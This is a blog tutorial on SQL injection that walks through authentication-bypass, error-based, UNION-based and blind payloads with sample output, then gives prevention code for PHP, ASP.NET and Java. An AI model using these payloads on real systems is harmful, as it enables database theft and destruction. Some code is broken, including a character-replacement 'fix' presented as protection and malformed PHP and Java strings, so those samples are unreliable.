---
layout: post
title:  "Sql Injection Prevention(PHP,ASP.NET,JAVA)"
date:   2019-12-17 20:17:31 1576601251
categories: securec0ding
tags: php java asp.net sql injection
description: Sql Injection Prevention in php, asp.net and java
---
# What is SQL injection (SQLi)?

![sql injection](/images/sql-injection.svg)


SQL is a query language that was designed to manage data stored in relational databases. You can use it to access, modify, and delete data. Many web applications and websites store all the data in SQL databases. 

In some cases, you can also use SQL commands to run operating system commands. Therefore, a successful SQL Injection attack can have very serious consequences.

Attackers can use SQL Injections to find the credentials of other users in the database. They can then impersonate these users. The impersonated user may be a database administrator with all database privileges.

SQL lets you select and output data from the database. An SQL Injection vulnerability could allow the attacker to gain complete access to all data in a database server.

SQL also lets you alter data in a database and add new data. 

For example, in a financial application, an attacker could use SQL Injection to alter balances, void transactions, or transfer money to their account.
You can use SQL to delete records from a database, even drop tables. Even if the administrator makes database backups, deletion of data could affect application availability until the database is restored. Also, backups may not cover the most recent data.

In some database servers, you can access the operating system using the database server. This may be intentional or accidental. In such case, an attacker could use an SQL Injection as the initial vector and then attack the internal network behind a firewall.

In some situations, an attacker can escalate an SQL injection attack to compromise the underlying server or other back-end infrastructure, or perform a denial-of-service attack.

# Simple SQL Injection Example
The first example is very simple. It shows, how an attacker can use an SQL Injection vulnerability to go around application security and authenticate as the administrator.

The following script is pseudocode executed on a web server. It is a simple example of authenticating with a username and a password. The example database has a table named users with the following columns: username and password.

{% highlight php  %}
# Define POST variables
uname = request.POST['username']
passwd = request.POST['password']

# SQL query vulnerable to SQLi
sql = “SELECT id FROM users WHERE username=’” + uname + “’ AND password=’” + passwd + “’”

# Execute the SQL statement
database.execute(sql)
{% endhighlight %}

These input fields are vulnerable to SQL Injection. An attacker could use SQL commands in the input in a way that would alter the SQL statement executed by the database server. For example, they could use a trick involving a single quote and set the passwd field to:

{% highlight php  %}
password' OR 1=1
{% endhighlight %}

As a result, the database server runs the following SQL query:

{% highlight php  %}
SELECT id FROM users WHERE username='username' AND password='password' OR 1=1'
{% endhighlight %}


Because of the OR 1=1 statement, the WHERE clause returns the first id from the users table no matter what the username and password are.

The first user id in a database is very often the administrator. 

In this way, the attacker not only bypasses authentication but also gains administrator privileges. 

They can also comment out the rest of the SQL statement to control the execution of the SQL query further:



{% highlight php  %}
-- MySQL, MSSQL, Oracle, PostgreSQL, SQLite
' OR '1'='1' --
' OR '1'='1' /*
-- MySQL
' OR '1'='1' #
-- Access (using null characters)
' OR '1'='1' %00
' OR '1'='1' %16
{% endhighlight %}


# Attack Mechanics

## Error Based

Error based injections are exploited through triggering errors in the database when invalid inputs are passed to it.

The error messages can be used to return the full query results, or gain information on how to restructure the query for further exploitation.


For example in Double-Query or Subquery Injection By combining two queries within a single query, it is possible to extract information from the database through it’s SQL error messages.

First, we have the following SQL Query and we have identified it is vulnerable to SQL Injection. This is going to be used as our base and we will be injecting our payload onto the end of it.

{% highlight php  %}
SELECT * FROM accounts WHERE id ='1'
{% endhighlight %}

### Enumerate Simple Database Information

Next, we would start enumerating the database in order to find out more information. 
We can use a double query injection, shown below, in order to enumerate built-in functions from the database. 
Functions such as user() & database() etc.


{% highlight php  %}
SELECT * FROM accounts WHERE id = '1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT user()), FLOOR(RAND()*2)) AS a FROM information_schema.tables GROUP BY a)x)-- -

ERROR 1062 (23000): Duplicate entry 'root@localhost2' for key 1
{% endhighlight %}


#### Breaking Down The Query:

First let’s examine the query below. We are joining together the following items using the CONCAT() function:

user(): This is a built-in command that will output the current user the database is running as.

RAND()*2 - This commands generates a random number and multiplies it by 2.

FLOOR(RAND()*2) - This command floors the result of RAND()*2, which would result in either a 1 or 0. The FLOOR() function returns the largest integer value that is equal to or less than the specified number.

GROUP BY - This function is used in order to display the unique values and then output them under a column called "a". This is done because information_schema.tables has 430 rows, meaning that it would generate 430 rows containing the result under a column called "a". However, we want to make sure we're only getting the unique values, which would return only 2 results. The unique values in this case being root@localhost0 and root@localhost1.

To summarise, this query will join together the database user() and either a ‘0’ or a ‘1’. Then only the unique values will be displayed under “a”.



{% highlight sql  %}
SELECT CONCAT((SELECT user()), FLOOR(RAND()*2)) AS a FROM information_schema.tables GROUP BY a;

+-----------------+
| a               |
+-----------------+
| root@localhost0 | 
| root@localhost1 | 
+-----------------+
2 rows in set (0.05 sec)
{% endhighlight %}

Next we are going to introduce the COUNT(*) function. By adding the count() function, the query now will now count how many times each value was generated, up to a maximum of the total number of rows in information_schema.tables (430). Eventually the statement will cause a database error, which then proceeds to leak the information we require.



{% highlight sql  %}
SELECT COUNT(*),CONCAT((SELECT user()), FLOOR(RAND()*2)) AS a FROM information_schema.tables GROUP BY a;

+----------+-----------------+
| COUNT(*) | a               |
+----------+-----------------+
|      213 | root@localhost0 | 
|      217 | root@localhost1 | 
+----------+-----------------+
2 rows in set (0.05 sec)

SELECT COUNT(*),CONCAT((SELECT user()), FLOOR(RAND()*2)) AS a FROM information_schema.tables GROUP BY a;

ERROR 1062 (23000): Duplicate entry 'root@localhost1' for key 1
{% endhighlight %}

Lastly, in order to execute it within our SQL Injection, we need to append it using an AND operation. However, it isnt possible to just simply use an AND by itself to join the queries together and when we execute it we are presented with the following error message

{% highlight sql  %}
SELECT * FROM accounts WHERE id = '1' AND (SELECT COUNT(*),CONCAT((SELECT user()), FLOOR(RAND()*2)) AS a FROM information_schema.tables GROUP BY a); 
ERROR 1241 (21000): Operand should contain 1 column(s)
{% endhighlight %}


This is due to the fact that the subquery is returning two columns! Therefore, in order to fix this, we can create a temporary table to store our two rows but then only select 1 result:


{% highlight sql  %}
SELECT * FROM accounts WHERE id = '1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()), FLOOR(RAND()*2)) AS a FROM information_schema.tables GROUP BY a)x)-- -

ERROR 1062 (23000): Duplicate entry 'root@localhost1' for key 1
{% endhighlight %}

We have inserted a select statement that will select 1 row from a temporary table called “x”. Voila! We have constructed a basic double-query injection that will dump the user that the database is currently running as. In this case, it’s root@localhost.

### Enumerating Tables

We can enumerate tables in a similar way as how we extracted the user() and database() information shown above. By switching out user() for the following SELECT statement, we can query information_schema.tables for any table_names that are in the current database. We can then proceed to enumerate table names,one by one, by using the LIMIT function. i.e. LIMIT 0,1. LIMIT 1,1 etc.


{% highlight sql  %}
SELECT * FROM accounts WHERE id = '1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), FLOOR(RAND()*5)) AS a FROM information_schema.tables GROUP BY a)x)-- -

ERROR 1062 (23000): Duplicate entry 'accounts2' for key 1
{% endhighlight %}

### Enumerating Columns

Again, like above, with some simple tweaking we can enumerate columns for the tables we discovered earlier. By swapping out the previous query for one that queries information_schema.columns, we can search for column_names that belong to a specific table. An example of this is shown below:


{% highlight sql  %}
SELECT * FROM accounts WHERE id = '1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT column_name FROM information_schema.columns WHERE table_name='accounts' LIMIT 0,1), FLOOR(RAND()*5)) AS a FROM information_schema.tables GROUP BY a)x)-- -

ERROR 1062 (23000): Duplicate entry 'cid0' for key 1

SELECT * FROM accounts WHERE id = '1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT column_name FROM information_schema.columns WHERE table_name='accounts' LIMIT 1,1), FLOOR(RAND()*5)) AS a FROM information_schema.tables GROUP BY a)x)-- -

ERROR 1062 (23000): Duplicate entry 'username3' for key 1

SELECT * FROM accounts WHERE id = '1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT column_name FROM information_schema.columns WHERE table_name='accounts' LIMIT 2,1), FLOOR(RAND()*5)) AS a FROM information_schema.tables GROUP BY a)x)-- -

ERROR 1062 (23000): Duplicate entry 'password0' for key 1
{% endhighlight %}

Like above, you can use LIMIT to cycle through column names one by one.


### Extracting Data from Columns


Now that we have enumerated the table names and the column names, we can expand on the payload above and actually extract information from the columns. 

Earlier, we noticed that we managed to find a table called accounts, and within that table there were columns called username & password.

We can use the SQL Function called MID() to extract data from columns. 

MID() allows you to specify a column_name to search, the start position (first position is 1), and the required numbers of characters.

The payload below combines multiple MID() functions in order to extract the username and password, separated by colon.



{% highlight sql  %}
SELECT * FROM accounts WHERE id = '1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT MID(username,1,63) FROM accounts LIMIT 0,1),':',(SELECT MID(password,1,63) FROM accounts LIMIT 0,1),':',(SELECT MID(password,1,63) FROM accounts LIMIT 2,1), FLOOR(RAND()*5)) AS a FROM information_schema.tables GROUP BY a)x)-- -

ERROR 1062 (23000): Duplicate entry 'admin:adminpass3' for key 1
{% endhighlight %}


## Union Based


Union based SQL injection allows an attacker to extract information from the database by extending the results returned by the original query. The Union operator can only be used if the original/new queries have the same structure (number and data type of columns).

When an application is vulnerable to SQL injection and the results of the query are returned within the application's responses, the UNION keyword can be used to retrieve data from other tables within the database. This results in an SQL injection UNION attack.

The UNION keyword lets you execute one or more additional SELECT queries and append the results to the original query. For example:

{% highlight sql  %}
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
{% endhighlight %}


This SQL query will return a single result set with two columns, containing values from columns a and b in table1 and columns c and d in table2.

For a UNION query to work, two key requirements must be met:

- The individual queries must return the same number of columns.
- The data types in each column must be compatible between the individual queries.

To carry out an SQL injection UNION attack, you need to ensure that your attack meets these two requirements. 

This generally involves figuring out:

- How many columns are being returned from the original query?
- Which columns returned from the original query are of a suitable data type to hold the results from the injected query?

### Determining the number of columns required in an SQL injection UNION attack

When performing an SQL injection UNION attack, there are two effective methods to determine how many columns are being returned from the original query.

The first method involves injecting a series of ORDER BY clauses and incrementing the specified column index until an error occurs. For example, assuming the injection point is a quoted string within the WHERE clause of the original query, you would submit:

{% highlight php  %}
http://fakesite.com/report.php?id=23 order by 5--+
{% endhighlight %}


Now we will use Union select statement over here.

{% highlight php %}
http://fakesite.com/report.php?id=23 union select 1,2,3,4,5--+
{% endhighlight %}

### Finding columns with a useful data type in an SQL injection UNION attack


The reason for performing an SQL injection UNION attack is to be able to retrieve the results from an injected query. Generally, the interesting data that you want to retrieve will be in string form, so you need to find one or more columns in the original query results whose data type is, or is compatible with, string data.

Having already determined the number of required columns, you can probe each column to test whether it can hold string data by submitting a series of UNION SELECT payloads that place a string value into each column in turn.

{% highlight php  %}
http://fakesite.com/report.php?id=-23 union select 'hello1','hello2','hello3','hello4','hello5'--+
{% endhighlight %}

Now just try to find it inside the source code. If you find hello1 that means the first colums is getting printed and if you found hello2 then the second column is getting printed and so on. Still some times if the programmer is using mysql_real_escape_string it may create an error or else no output. We can simply avoid the usage of single quotes using hex values. Below is the encoded query for the above same query.

{% highlight php  %}
http://fakesite.com/report.php?id=-23 union select 0x68656c6c6f31,0x68656c6c6f32,0x68656c6c6f33,0x68656c6c6f34,0x68656c6c6f35--+
{% endhighlight %}


One small thing to remember is that always add 0x before any hexadecimal value. Hopefully the above query should work and you will find the column which is getting printed on the webpage or inside the source code. We will stich up with 3rd column for this example. As we know that any thing on place of third column is getting printed. Then now we can try some Default functions and variables, to get some information related to our target. Below are some of the Variables/Functions that can be used to get information about your target machine.


![sql](/images/sql_short.png)

### Data Extraction using SQLi


As we know that third is the column which is getting printed so now we will use the above functions on place of that columns only.

To get the Current Database Name

{% highlight php  %}
http://fakesite.com/report.php?id=-23 union select 1,2,database(),4,5--+
{% endhighlight %}


To get the Current Version

{% highlight php  %}
http://fakesite.com/report.php?id=-23 union select 1,2,version(),4,5--+
{% endhighlight %}


To get the Current User

{% highlight php  %}
http://fakesite.com/report.php?id=-23 union select 1,2,user(),4,5--+
{% endhighlight %}


To get the Temporary Directory Path

{% highlight php  %}
http://fakesite.com/report.php?id=-23 union select 1,2,@@tmpdir,4,5--+
{% endhighlight %}


Now lets see how can we extract all the table names from a database.

{% highlight  php %}
http://fakesite.com/report.php?id=-23 union select 1,2,table_name,4,5 from information_schema.tables where table_schema=database()--+
{% endhighlight %}


After getting the Table Names we can move on and start collecting the names of Columns under any table. we can specify the table name as we have all the tablenames.

{% highlight php  %}
http://fakesite.com/report.php?id=-23 union Select 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='tablenamehere'--+
{% endhighlight %}


If the above query do not give any output or an error. You can try to hex the tablename.

Now we have to specify from which column we want the data and from which table. 

Query and injection is simple at this stage.

First row :

{% highlight php  %}
http://fakesite.com/report.php?id=-23 union Select 1,2,concat(column1,column2),4,5 from tablename limit 0,1--+
{% endhighlight %}


Second row :

{% highlight  php %}
http://fakesite.com/report.php?id=-23 union Select 1,2,concat(column1,column2),4,5 from tablename limit 1,1--+
{% endhighlight %}


Third row :

{% highlight php  %}
http://fakesite.com/report.php?id=-23 union Select 1,2,concat(column1,column2),4,5 from tablename limit 2,1--+
{% endhighlight %}


Forth row :

{% highlight  php %}
http://fakesite.com/report.php?id=-23 union Select 1,2,concat(column1,column2),4,5 from tablename limit 3,1--+
{% endhighlight %}



## Blind Based

Blind SQL injection is one of the more advanced methods of injection. The Partial-Blind and Full-Blind methods are detailed below. Use care when performing these queries, as they can overload a server if performed through heavy automation.

For example:

No Error Website Loaded Normally with this payloads

{% highlight php  %}
www.vuln-web.com/photo.php?id=1/
www.vuln-web.com/photo.php?id=1'
{% endhighlight %}


Normal Page returned with this payload

{% highlight php  %}
www.vuln-web.com/photo.php?id=1' and true%23
{% endhighlight %}


Page didn't Load As normally it do as the query din't returned anything.

{% highlight php  %}
www.vuln-web.com/photo.php?id=1' and false%23
{% endhighlight %}



That is good. we are on the right track now lets start the Blind SQL injection. Why we call it blind as we cant see anything we dont know anything what we do is just keep asking question from the database and get the reply in form of yes (Page loaded Normally) or NO (Page dint Loaded Normally).


### Content-based Blind SQL Injection


In the case of a Content-based Blind SQL Injection attack, the attacker makes different SQL queries that ask the database TRUE or FALSE questions. Then they analyze differences in responses between TRUE and FALSE statements.


This is an example of a web page of an online shop, which displays items that are for sale. The following link will display details about item 34, which are retrieved from a database.

{% highlight php  %}
http://www.shop.local/item.php?id=34
{% endhighlight %}


The SQL statement used for this request is:

{% highlight php  %}
SELECT column_name, column_name_2 FROM table_name WHERE id = 34
{% endhighlight %}


The attacker may manipulate the request to:

{% highlight php  %}
http://www.shop.local/item.php?id=34 and 1=2
{% endhighlight %}


The SQL statement changes to:

{% highlight php  %}
SELECT column_name_2 FROM table_name WHERE ID = 34 and 1=2SELECT name, description, price FROM Store_table WHERE ID = 34 and 1=2
{% endhighlight %}


This will cause the query to return FALSE and no items are displayed in the list. The attacker then proceeds to change the request to:

{% highlight php  %}
http://www.shop.local/item.php?id=34 and 1=1
{% endhighlight %}


And the SQL statement changes to:

{% highlight php  %}
SELECT column_name, column_name_2 FROM table_name WHERE ID = 34 and 1=1SELECT name, description, price FROM Store_table WHERE ID = 34 and 1=1
{% endhighlight %}


This returns TRUE, and the details of item with ID 34 are shown. This is a clear indication that the page is vulnerable.

### Time-based Blind SQL Injection

In the case of time-based attacks, the attacker makes the database perform a time-intensive operation. If the web site does not return a response immediately, the web application is vulnerable to Blind SQL Injection. A popular time-intensive operation is the sleep operation.


Based on the previous example, the attacker would first benchmark the web server response time for a regular query. They would then issue the following request:

{% highlight php  %}
http://www.shop.local/item.php?id=34 and if(1=1, sleep(10), false)
{% endhighlight %}


The web application is vulnerable if the response is delayed by 10 seconds.

## Prevention

### PHP

The following PHP SQL injection example will help you better understand the concept of SQL injections:

#### Example # 1

Suppose we have a form containing 2 text fields’ username and password, along with a login button. The backend PHP code will be as follows:

{% highlight php  %}
<?php
$userName=$_POST['userName'];
$password=$_POST['password'];
$sqlQuery="SELECT * FROM users WHERE user_name='".$username."' AND user_password='".$password"';";
?>
{% endhighlight %}

The above code contains a loophole, if a user enters ‘ or ‘a’=’a ‘or’ then the variable $password will have the value ‘ or ‘a’=’a ‘or’

In this way, the above query will be updated as:

{% highlight php  %}
<?php
$sqlQuery="SELECT * FROM users WHERE user_name='".$username."' AND user_password='' or 'a'='a';";
?>
{% endhighlight %}

In the above example, the statement a=a is always true. So the statement is executed without the matching of the actual password.

#### Example # 2

The SQL query is a legitimate program. And we are creating such a program dynamically, by adding some data on the fly. This data can interfere within the program code and can even alter it, as every SQL injection example shows it (all examples in PHP/Mysql):


{% highlight php  %}
$expected_data = 1;
$query = "SELECT * FROM users where id=$expected_data";
{% endhighlight %}

will produce a regular query

{% highlight php  %}
SELECT * FROM users where id=1
{% endhighlight %}


while this code can surprise you.

{% highlight php  %}
$spoiled_data = "1; DROP TABLE users;"
$query   = "SELECT * FROM users where id=$spoiled_data";
{% endhighlight %}


will produce a malicious sequence

{% highlight php  %}
SELECT * FROM users where id=1; DROP TABLE users;
{% endhighlight %}


### Solutions 

#### Method 1

Now you need to make a few changes in the previous code. Make a function like:

{% highlight php  %}
<?php
function BlockSQLInjection($str)
{
return str_replace(array("'",""","'",'"'),array("'","&quot;"'","&quot;",$str));
}
?>
{% endhighlight %}


Through the above statement, str_replace() function will replace all characters in the string. Now you will use the function as follows:

{% highlight php  %}
<?php
$userName=BlockSQLInjection($_POST['userName']);
$password=BlockSQLInjection($_POST['password']);
?>

{% endhighlight %}

These functions will help you avoid SQL injection vulnerabilities.


#### Method 2


Another approach for avoiding SQL injections is using PHP Prepared Statements. A prepared statement is a feature in PHP which enables users to execute similar SQL queries efficiently and repeatedly.

{% highlight php  %}
<?php
$stmt=$conn->prepare(INSERT INTO MyGuests(firstname,lastname,email)VALUES(?,?,?)");
$stmt->bind_param("sss",$firstname,$lastname,$email);
//set paramters and execute
$firstname="John";
$lastname="Doe";
$email="john@example.com";
$stmt->execute();
$firstname="Mary";
$lastname="Moe";
$email="mary@example.com";
$stmt->execute();
{% endhighlight %}


### ASP.NET


#### Example1 #1


web sites which attempts to validate a user who has tried to log in to a protected area of a web site:


{% highlight c# %}
protected void Button1_Click(object sender, EventArgs e)
{
  string connect = "MyConnString";
  string query = "Select Count(*) From Users Where Username = '" + UserName.Text + "' And Password = '" + Password.Text + "'";
  int result = 0;
  using (var conn = new SqlConnection(connect))
  {
    using (var cmd = new SqlCommand(query, conn))
    {
      conn.Open();
      result = (int)cmd.ExecuteScalar();
    }
  }
  if (result > 0)
  {
    Response.Redirect("LoggedIn.aspx");
  }
  else
  {
    Literal1.Text = "Invalid credentials";
}

{% endhighlight %}

This was achieved simply by entering ' or '1' = '1 into both the username textbox and the password textbox. If you study the SQL that has resulted from concatenating those user values with the core SQL, you will probably be able to see that it will always match at least one row. In fact, it will match all rows, so the variable result will be > 0. Sometimes, coders don't return a count. They return user's details so they can use them for allowing further permissions or similar. This SQL will return the first row that matches, which will be the first row in the table generally. Often, this is the admin account that you set up when developing the site, and has all privileges.

#### Example #2

The first OR clause will never be true. Job done. However, it does not protect against all avenues of attack. Consider the very common scenario where you are querying the database for an article, product or similar by ID. Typically, the ID is stored as a number - most of them are autogenerated by the database. The code will usually look like this:

{% highlight c# %}
string connect = "MyConnString";
string query = "Select * From Products Where ProductID = " + Request["ID"];

using (var conn = new SqlConnection(connect))
{
  using (var cmd = new SqlCommand(query, conn))
  {
    conn.Open();
    //Process results
  }
}
{% endhighlight %}


Now, in this case, the value for Request["ID"] could come from a posted form, or a querystring value - perhaps from a hyperlink on a previous page. It's easy for a malicious user to amend a querystring value. In the example caught by the VS debugger below, I just put ;Drop Table Admin-- on the end of the querystring before requesting the page.

The result, again is a legitimate SQL statement that will be run against the database. And the result will be that my Admin table will be deleted. You might be wondering how a hacker will know the names of your tables. Chances are they don't. But think about how you name your database objects. They are bound to be common sense names that reflect their purpose.


### Solutions

#### Method #1


Parameters in queries are placeholders for values that are supplied to a SQL query at runtime, in very much the same way as parameters act as placeholders for values supplied to a C# method at runtime. And, just as C# parameters ensure type safety, SQL parameters do a similar thing. If you attempt to pass in a value that cannot be implicitly converted to a numeric where the database field expects one, exceptions are thrown. In a previous example where the ProductID value was tampered with to append a SQL command to DROP a table, this will now cause an error rather than get executed because the semicolon and text cannot be converted to a number.

The SqlCommand class represents a SQL query or stored procedure to be executed against the database. It has a Parameters property which is a collection of SqlParameter objects. For each parameter that appears in the SQL statement, you need to add a Parameter object to the collection. This is probably simpler to explain through code, so taking the ProductID example as a starting point, here's how to rewrite the code:

{% highlight c# %}
protected void Page_Load(object sender, EventArgs e)
{
  var connect = ConfigurationManager.ConnectionStrings["NorthWind"].ToString();
  var query = "Select * From Products Where ProductID = @ProductID";
  using (var conn = new SqlConnection(connect))
  {
    using (var cmd = new SqlCommand(query, conn))
    {
      cmd.Parameters.Add("@ProductID", SqlDbType.Int);
      cmd.Parameters["@ProductID"].Value = Convert.ToInt32(Request["ProductID"]);
      conn.Open();
      //Process results
    }
  }
}
{% endhighlight %}


The connection string has been defined in the web.config file, and is obtained using the System.Configuration.ConfigurationManager class which provides access to items in the web.config file. In this case, it retrieves the value of the item in the connectionstrings area with the name "NorthWind". The SQL query is declared with a parameter: @ProductID. All parameters are prefixed with the @ sign. The connection object is declared next, with the connection string passed into the constructor. It's in a using block, which ensures that the connection is closed and disposed of without have to explicitly type code to manage that. The same is true of the SqlCommand object.


Adding the parameter to the SqlCommand.Parameters collection is relatively straightforward. there are two methods - the Add() method and the AddWithValue() method. The first of these has a number of overloads. I've used the Add(String, SqlDbType) option and then applied the value separately. It could be written all on one line like this:

{% highlight c# %}
cmd.Parameters.Add("@ProductID", SqlDbType.Int).Value = Convert.ToInt32(Request["ProductID"]);
{% endhighlight %}


Alternatively, I could use the AddWithValue(string, object) option like this:


{% highlight  c# %}
protected void Page_Load(object sender, EventArgs e)
{
  var connect = ConfigurationManager.ConnectionStrings["NorthWind"].ToString();
  var query = "Select * From Products Where ProductID = @ProductID";
  using (var conn = new SqlConnection(connect))
  {
    using (var cmd = new SqlCommand(query, conn))
    {
      cmd.Parameters.AddWithValue("@ProductID", Convert.ToInt32(Request["ProductID"]);

      conn.Open();
      //Process results
    }
  }
}
{% endhighlight %}


#### Method #2


It always interests me that whenever the subject of preventing SQL injection comes up in the www.asp.net forums, at least one person contributes the assertion that you must use stored procedures to make use of parameters. As I have demonstrated above, this is not true. However, if you do use stored procedures the code above can be used with just two amendments: you need to pass the name of the stored procedure instead of the SQL statement, and you must set the CommandType to CommandType.StoredProcedure. It's omitted at the moment because the default is CommandType.Text. Here's the revised code for a stored procedure which I shall call GetProductByID:

{% highlight c# %}
var connect = ConfigurationManager.ConnectionStrings["NorthWind"].ToString();
var query = "GetProductByID";

using (var conn = new SqlConnection(connect))
{
  using (var cmd = new SqlCommand(query, conn))
  {
    cmd.CommandType = CommandType.StoredProcedure;
    cmd.Parameters.Add("@ProductID", SqlDbType.Int).Value = Convert.ToInt32(Request["ProductID"]);
    conn.Open();
    //Process results
  }
}
{% endhighlight %}


### Java

We have one database server [MySQL] and web application server [Tomcat]. consider that database server is not connected to internet. but its connected with application server. Now we will see using web application how to extract the information using sql-injection method.

{% highlight  java %}
protected void processRequest(HttpServletRequest request, HttpServletResponse response)throws ServletException, IOException {
        response.setContentType('text/html;charset=UTF-8');
        PrintWriter out = response.getWriter();
        try {
 
            String user = request.getParameter('user');
            Connection conn = null;
            String url = 'jdbc:mysql://192.168.2.128:3306/';
            String dbName = 'anvayaV2';
            String driver = 'com.mysql.jdbc.Driver';
            String userName = 'root';
            String password = '';
            try {
                Class.forName(driver).newInstance();
                conn = DriverManager.getConnection(url + dbName, userName, password);
 
                Statement st = conn.createStatement();
                String query = 'SELECT * FROM  User where userId='' + user + ''';
                out.println('Query : ' + query);
                System.out.printf(query);
                ResultSet res = st.executeQuery(query);
 
                out.println('Results');
                while (res.next()) {
                    String s = res.getString('username');
                    out.println('\t\t' + s);
                }
                conn.close();
 
            } catch (Exception e) {
                e.printStackTrace();
            }
        } finally {
            out.close();
        }
{% endhighlight %}


What happens when I put admin’ or ‘1’=’1

{% highlight  java %}
SELECT * FROM User where userId =’admin’ or ‘1’=’1‘
{% endhighlight %}


its means

{% highlight  java %}
SELECT * FROM User where userId ='admin' or '1'='1'
{% endhighlight %}



like this. So our query is altered. now new query have 2 condition. 2nd condition always true. 1st condition may be or may not be true. but these 2 condition are connected with or logic. So where clause always true for all rows. the result is they bring all rows from our tables.


### Solutions


#### Method #1


- Before substitute into query, we need to do the validation. for remove ir escaped the special character like single quote, key words like select, Union…

- Use Prepared Statement with placeholder

{% highlight  java %}
PreparedStatement  preparedStatement=conn.prepareStatement('SELECT * FROM  usercheck where username=?') ;
preparedStatement.setString(1, user);
{% endhighlight %}



that setXXX() method do all the validation and escaping the special charcter

Now if use same blind sql injection like

admin’ or ‘1’=’1 then

{% highlight  java %}
SELECT * FROM User where userId='sdfssd\' or \'1\'=\'1'
{% endhighlight %}


Here all special character are escaped When we use JPA kind of ORM tools like Hibernate, EclipseLink, TopLink that time also may be sqlinjection is possible.

#### Method #2


To prevent the SQL injection we need to use NamedQuery instead of normal Query. Because NamedQuery internally used PreparedStement but normal query used norma Stement in java.


Normal Query in JPA:

{% highlight  java %}
String q='SELECT r FROM  User r where r.userId=''+user+''';
Query query=em.createQuery(q);
List users=query.getResultList();
{% endhighlight %}


So don’t use normal query, use Named query like this:

{% highlight  java %}
Query query=em.createNamedQuery('User.findByUserId');
query.setParameter('userId', user);
List users=query.getResultList();
{% endhighlight %}
